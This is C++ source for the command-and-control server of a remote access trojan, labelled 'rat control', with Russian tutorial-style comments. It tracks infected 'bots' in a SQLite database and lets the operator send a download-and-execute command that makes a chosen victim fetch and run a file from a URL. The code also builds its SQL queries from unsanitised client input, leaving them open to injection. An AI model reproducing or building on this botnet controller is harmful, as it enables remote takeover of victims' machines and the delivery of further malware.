#include "winsock.h"
#include "sqlite3.h"
#include "stdio.h"
#include <string>
#include <iostream>
#include "shlwapi.h"

using namespace std;

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "iphlpapi")
#pragma warning(disable : 4996)

sqlite3* db;

#define CMD_HADSHAKE	0x00
#define CMD_ONLINE		0x01
#define CMD_OTVET_OK	0x02
#define CMD_OTVET_ER	0x03
#define CMD_SCREEN		0x04
#define CMD_LOADER		0x05

struct CLIENTS
{
	SOCKET SOCKET;
	char USERNAME[100];
	char OSVER[100];
	char HWID[100];
};

struct DLE
{
	char URL[1000];
};

struct CMDiDATA
{
	DWORD CMD;
	char DATA[4000];
};

CLIENTS SOCKETS[10000];
int count_clients;

BOOL sendint(SOCKET con, int i)
{
	if (sizeof(int) == send(con, (char*)&i, sizeof(int), NULL))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL RecvStat(SOCKET Con)
{
	return sendint(Con, 0);
}

DWORD WINAPI isOnline(LPVOID param)
{
	while (TRUE)
	{
		sqlite3_stmt* stmt;
		if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
		{
			while (sqlite3_step(stmt) == SQLITE_ROW)
			{
				DWORD NOMER = sqlite3_column_int(stmt, 0);
				if (RecvStat(SOCKETS[NOMER].SOCKET) == FALSE)
				{
					char* ErrMsg = NULL;
					char* zapros = new char[1000];
					wsprintfA(zapros, "UPDATE BOT SET OTVET='0' WHERE NOMER='%d'", NOMER);
					if (SQLITE_OK == sqlite3_exec(db, zapros, nullptr, nullptr, &ErrMsg))
					{
						closesocket(SOCKETS[NOMER].SOCKET);
						if (count_clients > 0)
						{
							count_clients--;
						}
					} 
					delete[] zapros;
				}
			}
			sqlite3_finalize(stmt);
		}
		Sleep(10000);
	}
}

DWORD WINAPI RecvThread(LPVOID param)
{
	return 0;
}

void PrintOnlineClients()
{
	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT NOMER, HWID, USERNAME, OSVER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
	{
		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			DWORD NOMER = sqlite3_column_int(stmt, 0);
			char *HWID = (char *)sqlite3_column_text(stmt, 1);
			char *USERNAME = (char *)sqlite3_column_text(stmt, 2);
			char *OSVER = (char *)sqlite3_column_text(stmt, 3);
			printf("\n\t|NUM: %d|HWID: %s|USERNAME: %s|OSVER: %s|\n", NOMER, HWID, USERNAME, OSVER);
		}
	}
}

DWORD WINAPI Title(LPVOID param)
{
	while (TRUE)
	{
		char* cur_clients_mem = new char[100];
		wsprintfA(cur_clients_mem, " :: rat control :: clients online [%d] :: ", count_clients);
		SetConsoleTitleA(cur_clients_mem);
		delete[] cur_clients_mem;
		Sleep(1000);
	}
}

DWORD WINAPI ConsoleReader(LPVOID param)
{
	while (TRUE)
	{
		string line = { 0 }; //инициализируем класс стринг
		getline(cin, line); //считываем символы в этот класс из консоли
		char* mycmd = strdup(line.c_str()); //конвертируем эти сиволы в чары, вызывая метод с_str

		if ((mycmd[0] == 'c' && mycmd[1] == 'm' && mycmd[2] == 'd')) // если наша команда равна 'cmd'
		{
			//тут мы создаем какую нибудь команду и отсылаем ее клиенту
			if (mycmd[3] == ':') // если следуший символ двоеточие
			{
				int NOMER = 0; //создаем число которое изначально будет равно нулю

				char NUMCHAR[sizeof(int)]; //создаем массив чаров по размеру числа
				memset(NUMCHAR, 0, sizeof(NUMCHAR)); //очищаем его
				
				//создаем цикл в котором будем перебирать символы в команде, пока не наткнемся на двоеточие,
				//если символ не равен двоеточию он будет записан в NUMCHAR
				int i, j; 
				for (i = 4, j = 0; ; i++, j++)
				{
					if (mycmd[i] == ':')
					{
						break;
					}
					if (mycmd[i] == 0)
					{
						goto errparce;
					}
					NUMCHAR[j] = mycmd[i];
				}
				//конвертируем NUMCHAR в число NOMER
				NOMER = atoi(NUMCHAR);
				
				//а теперь начинаем парсить команды команд:) тафталогия но и всё равно
				if ((mycmd[i + 1] == 'd' && mycmd[i + 2] == 'l' && mycmd[i + 3] == 'e')) //download and execute - скачать и запустить
				{
					if (mycmd[i + 4] == ':') //если некст символ равен двоеточию
					{
						//то начинаем чистать в чары url наш урл из команды
						char url[1000]; 
						memset(url, 0, sizeof(url));
						int x, y;
						for (x = i + 5, y = 0; ; x++, y++)
						{
							if (mycmd[x] == 0) //пока строка не завершится
							{
								break;
							}
							url[y] = mycmd[x];
						}
						if (url[0] != 0) //если первый символ массива чаров url не равен нулю
						{
							printf("\n\t zagruzka u vupolnenie url: %s...; NOMER: %d", url, NOMER);
							CMDiDATA indata; //создаем структуру отвечающую за протокол
							DLE dlecmd; //инициализируем структуру которая будет отвечать за хранение URL
							//по сути мы могли бы просто скопировать урл в indata.DATA, но я тут конечно
							//немного расширю данную функциональность структуры, так что лучше будет так 
							memset(&indata, 0, sizeof(CMDiDATA)); //почистим
							memset(&dlecmd, 0, sizeof(DLE)); //почистим
							memcpy(dlecmd.URL, url, sizeof(url)); //скопируем url в структуру DLE
							indata.CMD = CMD_LOADER; //присвоим номер команды для загрузки файла
							memcpy(indata.DATA, dlecmd.URL, sizeof(dlecmd.URL)); //скопируем DLE в indata.DATA
							send(SOCKETS[NOMER].SOCKET, (char*)&indata, sizeof(CMDiDATA), 0); //отпарвляем протокольную структуру на клиент по номеру NOMER в массиве SOCKETS
						}
					}
				}
			}
		}
		else if ((mycmd[0] == 'o' && mycmd[1] == 'n' && mycmd[2] == 'l'))
		{
			//печатаем всех клиентов онлайн
			PrintOnlineClients(); 
		}
		else if ((mycmd[0] == 'c' && mycmd[1] == 'l' && mycmd[2] == 's'))
		{
			//очистим консоль
			system("cls"); 
		}

	errparce:
		continue;
	}
}

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	AllocConsole();

	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	count_clients = 0;

	memset(SOCKETS, 0, sizeof(SOCKETS));

	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);

	SOCKET sListen;
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(80);
	int sizeofaddr = sizeof(addr);
	sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeofaddr);
	listen(sListen, SOMAXCONN);
	
	int rc;
	rc = sqlite3_open("bots.db", &db);
	
	if (!rc)
	{
		CreateThread(NULL, 0, Title, NULL, 0, 0); //вызываем функцию записи кол-ва клиентов в заголовок консоли
		CreateThread(NULL, 0, isOnline, NULL, 0, 0); //вызываем функцию проверки на онлайн наших клиентов
		CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0); //вызываем функцию считывания из консоли нашего ввода

		for (;;) //цикл приема клиентов - он будет ожидать выполнения accept
		{
			sockaddr_in addr; //в другой раз объясню зчм
							  //при подключении нового клиента каждый раз наша функция accept будет срабатывать
							  //и новый клиент будет регистрироваться под сокетом newConn
			SOCKET newConn = accept(sListen, (sockaddr*)&addr, &sizeofaddr);
			{
				CMDiDATA indata; //создаем структуру отвечающую за протокол
				CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
				memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
				memset(&client, 0, sizeof(CLIENTS)); //почистим
				
				//recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0);
				if (sizeof(CMDiDATA) != recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от клиента
				{
					closesocket(newConn);
					continue;
				}

				if (indata.CMD == CMD_HADSHAKE) //если CMD = CMD_HADSHAKE, то это хендшейк
				{
					memcpy(&client, indata.DATA, sizeof(CLIENTS)); //копируем DATA в структуру client

					char* zapros_1 = new char[1000];
					//тут было бы возможно провести sql инъекцию, если бы не SELECT *'; DROP TABLE BOT;-- 
					wsprintfA(zapros_1, "SELECT NOMER FROM BOT WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);

					sqlite3_stmt* stmt_1;
					// тут мы ищем по хвиду, имени юзера, и версии ос запись в базе данных
					if (sqlite3_prepare_v2(db, zapros_1, -1, &stmt_1, 0) == SQLITE_OK)
					{
						if (sqlite3_step(stmt_1) == SQLITE_ROW)
						{
							int NOMER = 0;
							//если запись есть - то выполняется следующий код:
							NOMER = sqlite3_column_int(stmt_1, 0);
							char* zapros_2 = new char[1000];
							wsprintfA(zapros_2, "UPDATE BOT SET OTVET='1' WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);
							char* ErrMsg = NULL;
							//тут мы обновляем запись в базе данных делая поле ответ = 1, показывая что клиент теперь онлайн
							if (SQLITE_OK == sqlite3_exec(db, zapros_2, nullptr, nullptr, &ErrMsg))
							{
								SOCKETS[NOMER].SOCKET = newConn;
								memcpy(SOCKETS[NOMER].HWID, client.HWID, sizeof(client.HWID));
								memcpy(SOCKETS[NOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
								memcpy(SOCKETS[NOMER].OSVER, client.OSVER, sizeof(client.OSVER));
								//тут может быть сигнал о том что клиент теперь онлайн
								count_clients++;
							}
							else
							{
								printf("ZAPROS: %s;\nError: %s\n", zapros_2, ErrMsg);
							}
							//чистим строку
							delete[] zapros_2;
						}
						else //если клиент не найден то берем самое максимальное число записи из бд
						{
							sqlite3_stmt* stmt_3;
							if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT ORDER BY NOMER DESC LIMIT 1", -1, &stmt_3, 0) == SQLITE_OK && sqlite3_step(stmt_3) == SQLITE_ROW)
							{
								int NEWNOMER = sqlite3_column_int(stmt_3, 0) + 1; // и плюсуем единичку
								char* zapros_3 = new char[1000];
								wsprintfA(zapros_3, \
									"INSERT INTO BOT (NOMER, HWID, USERNAME, OSVER, OTVET) VALUES ('%d', '%s', '%s', '%s', 1)", \
									NEWNOMER, client.HWID, client.USERNAME, client.OSVER);
								char* ErrMsg = NULL;
								if (SQLITE_OK == sqlite3_exec(db, zapros_3, nullptr, nullptr, &ErrMsg))
								{
									SOCKETS[NEWNOMER].SOCKET = newConn;
									memcpy(SOCKETS[NEWNOMER].HWID, client.HWID, sizeof(client.HWID));
									memcpy(SOCKETS[NEWNOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
									memcpy(SOCKETS[NEWNOMER].OSVER, client.OSVER, sizeof(client.OSVER));
									//сигнал тут может быть о том что новый клиент онлайн
									printf("\n\nclient.HWID: %s\n\tlen: %d\n\nclient.USERNAME: %s\n\tlen: %d\n\nclient.OSVER: %s\n\tlen: %d\n\n", client.HWID, lstrlenA(client.HWID), client.USERNAME, lstrlenA(client.USERNAME), client.OSVER, lstrlenA(client.OSVER));
									count_clients++;
								}
								else
								{
									printf("ZAPROS: %s;\nError: %s\n", zapros_3, ErrMsg);
								}
								sqlite3_finalize(stmt_3);
								//чистим строку
								delete[] zapros_3;
							}
						}
					} 
					else
					{
						printf("ZAPROS: %s;\nERR: %s\n", zapros_1, sqlite3_errmsg(db));
					}
					sqlite3_finalize(stmt_1);
					//чистим строку
					delete[] zapros_1;
				}
			}
		}
	} 
	else 
	{
		printf("Can't open database: %s\n", sqlite3_errmsg(db));
		system("pause");
	}
}